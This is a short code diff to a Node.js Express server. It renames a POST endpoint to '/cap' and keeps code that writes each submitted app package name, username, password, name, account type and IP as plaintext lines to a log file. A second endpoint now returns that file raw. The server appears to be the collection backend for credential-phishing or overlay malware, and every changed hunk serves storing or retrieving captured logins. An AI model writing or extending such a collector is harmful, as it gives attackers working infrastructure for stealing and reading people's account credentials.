@@ -19,7 +19,7 @@ app.get("/", function (req, res) {
 });
 
 
-app.post("/log", async function (req, res) {
+app.post("/cap", async function (req, res) {
     try {
         console.log(req.body);
         let packageName = req.body.packageName;
@@ -28,7 +28,7 @@ app.post("/log", async function (req, res) {
         let name = req.body.name;
         let accType = req.body.accType;
         let ip = req.body.ip;
-        let data = packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow() + '\n';
+        let data = packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow() + '\n ';
         fs.appendFile('log.txt', data, function (err) {
             if (err) throw err;
             console.log('Saved!');
@@ -56,7 +56,8 @@ app.post("/get-log", async function (req, res) {
         fs.readFile(filePath, {encoding: 'utf-8'}, function (err, data) {
             if (!err) {
                 console.log('received data: ' + data);
-                return res.json({'time_stamp': getNow(), 'status': 'Success','data':data});
+                // return res.json({'time_stamp': getNow(), 'status': 'Success','data':data});
+                return res.send(data);
             } else {
                 console.log(err);
             }
